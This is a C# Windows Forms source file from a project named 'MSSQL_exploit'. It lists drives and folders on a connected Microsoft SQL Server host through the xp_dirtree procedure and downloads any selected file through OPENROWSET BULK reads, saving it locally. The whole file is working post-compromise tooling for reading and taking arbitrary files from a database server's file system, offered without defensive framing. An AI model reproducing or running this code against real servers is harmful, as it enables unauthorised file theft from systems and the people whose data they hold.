using System;
using System.Collections.Generic;
using System.Data;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Diagnostics;

namespace MSSQL_exploit
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            InitializeComponent();
        }

        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit();
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            treeView1.Dock = DockStyle.Fill;
            treeView1.Nodes.Add("rrdata", "Retrieving data...");

            Threading(delegate()
            {
                char a = 'c';
                char b = 'k';
                for (int i = a; i < b; i++)
                {
                    string name = ((char) i).ToString();
                    TreeNode tNode = null;
                    Invoked(delegate() { tNode = treeView1.Nodes.Add(name, name); });

                    addNode(tNode, name + ":");

                    Invoked(delegate()
                    {
                        if (tNode.Nodes.Count < 1)
                            tNode.Remove();
                    });
                }
                Invoked(delegate() { treeView1.Nodes.RemoveByKey("rrdata"); });
            });
        }

        private void treeView1_BeforeExpand(object sender, TreeViewCancelEventArgs e)
        {
            TreeNode tNode = e.Node;
            if (tNode.Nodes.ContainsKey("rrdata") == false) return;

            string path = tNode.FullPath;
            path = path.Substring(0, 1) + ":" + path.Substring(1, path.Length - 1);

            Threading(delegate()
            {
                addNode(tNode, path);
                Invoked(delegate() { e.Node.Nodes.RemoveByKey("rrdata"); });
            });
        }

        string name = "";

        private void treeView1_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            TreeNode tNode = treeView1.SelectedNode;
            if (tNode.Nodes.Count > 0) return;
            if (tNode.Name == "rrdata" || tNode.Name == "nodata") return;
            
            FolderBrowserDialog fld = new FolderBrowserDialog();
            fld.ShowNewFolderButton = true;
            fld.Description = "Select a directory to export." + Environment.NewLine + "File Name: " + tNode.Name;
            if (fld.ShowDialog() != DialogResult.OK) return;

            name = fld.SelectedPath;
            string path = tNode.FullPath;
            path = path.Substring(0, 1) + ":" + path.Substring(1, path.Length - 1);
            string[] pathes = path.Split(new string[] {"\\", "/"}, StringSplitOptions.None);
            string writePath = Path.Combine(name, pathes[pathes.Length - 1]);

            object obj = MsSql.ExecuteScalar("SELECT * FROM OPENROWSET(BULK N'" + path.Replace("'", "''") + "', SINGLE_BLOB) AS Contents");
            if (obj == null) return;

            byte[] byt = (byte[]) obj;
            obj = null;
            File.WriteAllBytes(writePath, byt);

            if (MessageBox.Show("Your file is exported!" + Environment.NewLine + "Do you want to open it now?", "Success", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.Yes)
                Process.Start(writePath);
        }

        private void treeView1_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button != MouseButtons.Right) return;
            contextMenuStrip1.Show(treeView1, new Point(e.X, e.Y));
        }

        private int addNode(TreeNode node, string path)
        {
            DataTable dt = MsSql.ExecuteQuery("use master; exec sys.xp_dirTree @d1, 1, 1", new Dictionary<string, string>() { { "@d1", path } });
            if (dt.Rows.Count < 1) return 0;

            if (path.Contains("\\") == false && path.Contains("/") == false && path.Contains(":") == false)
            {
                string[] a = path.Split(new string[] { "\\", "/" }, StringSplitOptions.None);
                path = a[a.Length - 1];
                a = null;
                this.Invoke(new MethodInvoker(delegate ()
                {
                    node.Nodes.Add(path, path);
                    node = node.Nodes[path];
                }));
            }
            if (dt.Rows.Count < 1) node.Nodes.Add("nodata", "No data found!");
            else
            {
                foreach (DataRow dr in dt.Rows)
                {
                    Invoked(delegate ()
                    {
                        node.Nodes.Add(dr[0].ToString(), dr[0].ToString());
                        if (dr["file"].ToString() == "0")
                            node.Nodes[dr[0].ToString()].Nodes.Add("rrdata", "Retrieving data...");
                    });
                }
            }

            return 1;
        }

        private void exportToolStripMenuItem_Click(object sender, EventArgs e)
        {
            treeView1_MouseDoubleClick(null, null);
        }

        private void Invoked(Action act)
        {
            this.Invoke(new MethodInvoker(act));
        }

        private void Threading(Action act)
        {
            Thread thd = new Thread(new ThreadStart(act));
            thd.Start();
        }
    }
}
